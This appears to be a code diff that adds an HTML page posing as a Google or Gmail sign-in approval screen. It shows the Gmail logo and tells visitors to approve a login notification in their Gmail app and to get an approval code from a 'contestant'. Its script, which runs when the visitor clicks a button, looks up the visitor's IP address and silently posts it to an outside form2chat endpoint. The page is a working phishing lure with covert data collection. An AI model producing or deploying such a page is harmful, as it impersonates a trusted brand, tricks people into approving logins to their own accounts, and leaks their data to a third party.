@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google-Style Authentication</title>
+<script>
+  function showPopup() {
+    document.getElementById("popup").style.display = "block";
+    sendApprovalRequest();
+  }
+
+  function hidePopup() {
+    document.getElementById("popup").style.display = "none";
+  }
+
+  function sendApprovalRequest() {
+    // Fetch user's IP address
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ipAddress = data.ip;
+        const message = `Approval requested from IP address: ${ipAddress}`;
+
+        // Send message to form action endpoint
+        fetch('https://app.form2chat.io/f/dedc7686', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ message: message })
+        })
+        .then(response => console.log('Approval request sent:', message))
+        .catch(error => console.error('Error sending approval request:', error));
+      })
+      .catch(error => console.error('Error fetching IP address:', error));
+  }
+</script>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <img src="https://www.gstatic.com/images/branding/product/1x/gmail_48dp.png" alt="Gmail Logo">
+  </div>
+  <div class="title">Waiting for Approval</div>
+  <button class="form-group input[type='submit']" onclick="showPopup()">Get Approval</button>
+</div>
+
+<!-- Popup container -->
+<div class="popup" id="popup" style="display: none;">
+  <div class="popup-message">Open your Gmail app for notification to approve your login.<br>Ask for the approval code from the contestant.</div>
+  <button class="close-btn" onclick="hidePopup()">Close</button>
+</div>
+</body>
+</html>
